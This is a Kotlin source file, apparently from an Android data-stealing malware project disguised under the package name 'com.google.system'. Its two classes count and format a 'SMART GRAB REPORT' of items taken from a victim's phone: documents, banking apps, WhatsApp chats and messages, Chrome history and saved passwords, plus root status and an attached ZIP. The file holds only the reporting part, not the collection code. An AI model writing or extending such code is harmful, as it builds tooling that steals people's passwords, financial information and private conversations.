package com.google.system

import java.io.File

class GrabReport {
    var files: Int = 0
    var size: Long = 0
    var highValue: Int = 0
    var docsFound: Int = 0
    var banksFound: Int = 0
    var whatsappChats: Int = 0
    var whatsappMessages: Int = 0
    var chromeUrls: Int = 0
    var chromePasswords: Int = 0

    fun build(): String {
        val sizeStr = when {
            size < 1024 -> "${size}B"
            size < 1024 * 1024 -> "${size / 1024}KB"
            else -> "${size / (1024 * 1024)}MB"
        }
        val sb = StringBuilder()
        sb.appendLine("═══════════════════════════════════════════")
        sb.appendLine("  SMART GRAB REPORT")
        sb.appendLine("═══════════════════════════════════════════")
        sb.appendLine()
        sb.appendLine("  • Total files grabbed: $files")
        sb.appendLine("  • Total size: $sizeStr")
        sb.appendLine("  • High-value items: $highValue")
        sb.appendLine()
        sb.appendLine("  ─── BREAKDOWN ───")
        if (docsFound > 0) sb.appendLine("  📄 Documents (PDF, Office): $docsFound files")
        if (banksFound > 0) sb.appendLine("  🏦 Banking apps detected: $banksFound")
        if (whatsappChats > 0) sb.appendLine("  💬 WhatsApp chats: $whatsappChats chats, $whatsappMessages messages")
        if (chromeUrls > 0) sb.appendLine("  🌐 Chrome history: $chromeUrls URLs")
        if (chromePasswords > 0) sb.appendLine("  🔐 Chrome saved passwords: $chromePasswords")
        sb.appendLine()
        sb.appendLine("  ─── LOCATION ───")
        sb.appendLine("  Raw ZIP data attached below")
        sb.appendLine()
        sb.appendLine("═══════════════════════════════════════════")
        return sb.toString()
    }
}

class GrabResult(
    val hasRoot: Boolean = false,
    val installedCount: Int = 0
) {
    var file: File? = null
    var size: Long = 0
    var files: Int = 0
    var highValue: Int = 0
    var error: String? = null
    var report: String? = null
    var docsFound: Int = 0
    var banksFound: Int = 0
    var whatsappChats: Int = 0
    var whatsappMessages: Int = 0
    var chromeUrls: Int = 0
    var chromePasswords: Int = 0

    fun summary(): String {
        val s = when {
            size < 1024 -> "${size}B"
            size < 1024 * 1024 -> "${size / 1024}KB"
            else -> "${size / (1024 * 1024)}MB"
        }
        val root = if (hasRoot) " [ROOT]" else ""
        val extra = mutableListOf<String>()
        if (whatsappMessages > 0) extra.add("$whatsappMessages msgs")
        if (chromePasswords > 0) extra.add("$chromePasswords passwords")
        if (banksFound > 0) extra.add("$banksFound banks")
        val extraStr = if (extra.isNotEmpty()) " | ${extra.joinToString(", ")}" else ""
        return "$files files ($highValue high-value) — $s | $installedCount apps scanned$root$extraStr"
    }
}
